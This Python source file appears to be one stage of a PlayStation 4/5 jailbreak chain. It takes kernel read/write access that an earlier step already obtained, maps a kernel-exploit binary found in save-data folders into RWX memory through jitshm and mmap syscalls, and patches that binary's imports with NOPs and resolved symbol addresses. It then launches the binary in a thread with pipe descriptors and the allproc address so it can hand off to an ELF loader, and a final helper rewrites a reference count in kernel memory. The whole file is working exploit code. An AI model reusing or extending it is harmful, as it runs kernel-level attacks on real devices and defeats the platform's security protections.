import os
import struct

from sc import sc
from utils.etc import alloc
from utils.ref import get_ref_addr
from utils.unsafe import writebuf, readbuf
from utils.conversion import u64_to_i64
from utils.rp import log
from constants import SHARED_VARS, SYSCALL, SELECTED_LIBC
from offsets import LIBC_OFFSETS

PAGE_SIZE = 0x4000
PROT_RWX = 0x7

LIBKERNEL_HANDLE = 0x2001
LIBC_HANDLE = 2

M64 = 0xFFFFFFFFFFFFFFFF

KEXP_SIZE = 18912
KEXP_PATCH = {
    "resolver_calls": [0x1c, 0x23],
    "getpid_call_at": 0x10f1,
    "getpid_tail_at": 0x10fb,
    "getpid_tail": [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
    "getpid_pad_from": 0x1101,
    "getpid_pad_to": 0x1106,
    "log_calls": [0x126d, 0x12ad, 0x3bc2],
    "libkernel_imports": [
        (0x48b0, "sceKernelSendNotificationRequest"),
        (0x48b8, "sysctlbyname"),
        (0x48c0, "pthread_create"),
        (0x48c8, "pthread_join"),
    ],
    "libc_imports": [
        (0x48d0, "malloc"),
        (0x48d8, "free"),
        (0x48e0, "memcpy"),
        (0x48e8, "memset"),
        (0x48f0, "strcmp"),
        (0x48f8, "memcmp"),
        (0x4900, "vsnprintf"),
    ],
}

LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["Thrd_create"] = 0x4D150
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["Thrd_create"] = 0x4D150
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS5"]["Thrd_create"] = 0x4BF0
LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["Thrd_join"] = 0x4CF50
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["Thrd_join"] = 0x4CF50
LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS5"]["Thrd_join"] = 0x49F0

SYSCALL["mmap"] = 477
SYSCALL["jitshm_create"] = 0x215
SYSCALL["jitshm_alias"] = 0x216
SYSCALL["dlsym"] = 0x24F


def find_payload_file(configured_name, fallback_name):
    payload_dirs = ["/saves/yarpe_autoload/", "/saves/yarpe/", "/savedata0/"]

    for sdir in payload_dirs:
        if configured_name and "@@" not in configured_name:
            path = sdir + configured_name
            if os.path.exists(path):
                return path
        if fallback_name:
            path = sdir + fallback_name
            if os.path.exists(path):
                return path

    title = _get_title_id()
    if title:
        for slot in ["000", "001", "002"]:
            base = "/mnt/sandbox/%s_%s/savedata0/" % (title, slot)
            if configured_name and "@@" not in configured_name:
                path = base + configured_name
                if os.path.exists(path):
                    return path
            if fallback_name:
                path = base + fallback_name
                if os.path.exists(path):
                    return path

    return None


def _get_title_id():
    try:
        if "TITLE_ID" in SHARED_VARS:
            return SHARED_VARS["TITLE_ID"]
    except:
        pass
    return None


def read_payload_file(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except:
        return None


def align_to(size, alignment):
    return (size + alignment - 1) & ~(alignment - 1)


def kexp_dlsym(handle, symbol):
    out_buf = alloc(8)
    ret = u64_to_i64(sc.syscalls.dlsym(handle, symbol, out_buf))
    if ret == -1:
        log("[-] dlsym(%#x, %s) failed: %s" % (
            handle, symbol, sc.syscalls.dlsym.get_error_string()))
        return 0
    return struct.unpack("<Q", out_buf[0:8])[0]


def write_nop(addr, count):
    for i in range(count):
        writebuf(addr + i, b"\x90")


def patch_imports(entry_addr, size):
    if size != KEXP_SIZE:
        # ps5-kexp resolves its imports dynamically via dlsym
        return True

    for offset in KEXP_PATCH["resolver_calls"]:
        if bytearray(readbuf(entry_addr + offset, 1))[0] != 0xE8:
            return True

    for offset in KEXP_PATCH["resolver_calls"]:
        write_nop(entry_addr + offset, 5)

    getpid_addr = kexp_dlsym(LIBKERNEL_HANDLE, "getpid")
    writebuf(entry_addr + KEXP_PATCH["getpid_call_at"], "\x48\xb8")
    writebuf(
        entry_addr + KEXP_PATCH["getpid_call_at"] + 2,
        struct.pack("<Q", getpid_addr),
    )
    for i, byte in enumerate(KEXP_PATCH["getpid_tail"]):
        writebuf(entry_addr + KEXP_PATCH["getpid_tail_at"] + i, struct.pack("<B", byte))
    write_nop(
        entry_addr + KEXP_PATCH["getpid_pad_from"],
        KEXP_PATCH["getpid_pad_to"] - KEXP_PATCH["getpid_pad_from"],
    )

    for offset, name in KEXP_PATCH["libkernel_imports"]:
        writebuf(entry_addr + offset, struct.pack("<Q", kexp_dlsym(LIBKERNEL_HANDLE, name)))
    for offset, name in KEXP_PATCH["libc_imports"]:
        writebuf(entry_addr + offset, struct.pack("<Q", kexp_dlsym(LIBC_HANDLE, name)))

    for offset in KEXP_PATCH["log_calls"]:
        if bytearray(readbuf(entry_addr + offset, 1))[0] == 0xE8:
            write_nop(entry_addr + offset, 5)

    return True


def launch(ctx):
    ctx["restore_thread_attributes"]()

    if not ctx["kbase"] or not ctx["proc_fd_addr"]:
        ctx["report"]("Kernel", "kernel r/w is incomplete")
        return False

    allproc = ctx["kaddr"](ctx["off"]["allproc"])
    if (allproc >> 32) & 0xFFFF0000 != 0xFFFF0000:
        ctx["report"]("Kernel", "invalid allproc address %#x" % allproc)
        return False

    elfldr_path = find_payload_file("@@ELFLDR_FILE@@", "elfldr-ps5.elf")
    if not elfldr_path:
        ctx["report"]("Kernel", "elfldr payload not found")
        return False
    elfldr_data = read_payload_file(elfldr_path)
    if not elfldr_data:
        ctx["report"]("Kernel", elfldr_path + " could not be read")
        return False
    elfldr_buf = bytearray(elfldr_data)
    elfldr_ptr = get_ref_addr(elfldr_buf)

    kexp_path = find_payload_file("@@KEXP_FILE@@", "kexp.bin")
    if not kexp_path:
        ctx["report"]("Kernel", "kexp binary not found")
        return False
    kexp_data = read_payload_file(kexp_path)
    if not kexp_data:
        ctx["report"]("Kernel", kexp_path + " could not be read")
        return False
    kexp_aligned_size = align_to(len(kexp_data), PAGE_SIZE)

    exec_fd = u64_to_i64(sc.syscalls.jitshm_create(0, kexp_aligned_size, PROT_RWX))
    entry_addr = u64_to_i64(
        sc.syscalls.mmap(0, kexp_aligned_size, PROT_RWX, 0x1, exec_fd, 0)
    )

    if entry_addr == -1 or entry_addr == 0:
        alias_fd = u64_to_i64(sc.syscalls.jitshm_alias(exec_fd, 0x3))
        rw_addr = u64_to_i64(sc.syscalls.mmap(0, kexp_aligned_size, 0x3, 0x1, alias_fd, 0))
        writebuf(rw_addr, kexp_data)
        entry_addr = u64_to_i64(
            sc.syscalls.mmap(0, kexp_aligned_size, PROT_RWX, 0x1, exec_fd, 0)
        )
    else:
        writebuf(entry_addr, kexp_data)

    if not patch_imports(entry_addr, len(kexp_data)):
        return False

    args = alloc(0x40)
    args[0:0x40] = b"\x00" * 0x40
    args[0x00:0x04] = struct.pack("<I", ctx["master"]["read_fd"])
    args[0x04:0x08] = struct.pack("<I", ctx["master"]["write_fd"])
    args[0x08:0x0C] = struct.pack("<I", ctx["victim"]["read_fd"])
    args[0x0C:0x10] = struct.pack("<I", ctx["victim"]["write_fd"])
    args[0x10:0x18] = struct.pack("<Q", allproc & M64)
    args[0x18:0x20] = struct.pack("<Q", elfldr_ptr)
    args[0x20:0x28] = struct.pack("<Q", len(elfldr_data))

    create_fn_addr = kexp_dlsym(LIBKERNEL_HANDLE, "scePthreadCreate")
    if not create_fn_addr:
        create_fn_addr = sc.libc_addr + SELECTED_LIBC["Thrd_create"]
    join_fn_addr = kexp_dlsym(LIBKERNEL_HANDLE, "scePthreadJoin")
    if not join_fn_addr:
        join_fn_addr = sc.libc_addr + SELECTED_LIBC["Thrd_join"]

    pthread_create = sc.make_function_if_needed("kexp_pthread_create", create_fn_addr)
    pthread_join = sc.make_function_if_needed("kexp_pthread_join", join_fn_addr)

    args_addr = get_ref_addr(args)

    SHARED_VARS["allproc"] = allproc
    SHARED_VARS["curproc"] = ctx["curproc"]
    SHARED_VARS["kernel_read_fast"] = ctx["kread_fast"]
    SHARED_VARS["kernel_write_fast"] = ctx["kwrite_fast"]

    spawn_err = None

    thr_handle_addr = alloc(8)
    created = u64_to_i64(pthread_create(thr_handle_addr, 0, entry_addr, args_addr))
    if created != 0:
        spawn_err = "pthread_create returned %#x" % created
        ctx["report"]("Kernel", spawn_err)
        return False

    thr_handle = struct.unpack("<Q", thr_handle_addr[0:8])[0]
    ctx["on_handoff"]()

    result_addr = alloc(8)
    joined = u64_to_i64(pthread_join(thr_handle, result_addr))
    if joined != 0:
        spawn_err = "pthread_join returned %#x" % joined
        ctx["report"]("Kernel", spawn_err)
        return False

    ctx["stage"](
        "kexp: elfldr returned %#x" % struct.unpack("<Q", result_addr[0:8])[0]
    )

    return True


def bump_refcount(file_addr, kread32, kwrite32):
    count = kread32(file_addr + 0x28)
    if count < 0:
        return False
    return kwrite32(file_addr + 0x28, count + 0x100) == 0
